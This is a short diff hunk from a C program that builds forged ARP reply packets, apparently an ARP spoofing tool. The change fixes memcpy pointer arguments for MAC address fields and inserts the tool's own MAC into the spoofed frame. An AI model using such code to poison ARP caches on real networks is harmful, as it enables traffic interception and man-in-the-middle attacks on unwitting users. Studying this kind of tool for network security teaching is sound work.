@@ -148,10 +148,10 @@ int main(int argc, char* argv[], char* envp[]) {
     spoofing->p_size = 4;
     spoofing->opcode = my_ntohs(2);
 
-    memcpy(spoofing->eth.ether_dhost, &packet->sender_mac, 6);
+    memcpy(spoofing->eth.ether_dhost, packet->sender_mac, 6);
     memcpy(spoofing->eth.ether_shost, &my_mac, 6);
     memcpy(spoofing->target_mac, &my_mac, 6);
-    memcpy(spoofing->sender_mac, &packet->sender_mac, 6);
+    memcpy(spoofing->sender_mac, packet->sender_mac, 6);
 
     insert_ip(spoofing->sender_ip, sender_ip);
     insert_ip(spoofing->target_ip, target_ip);
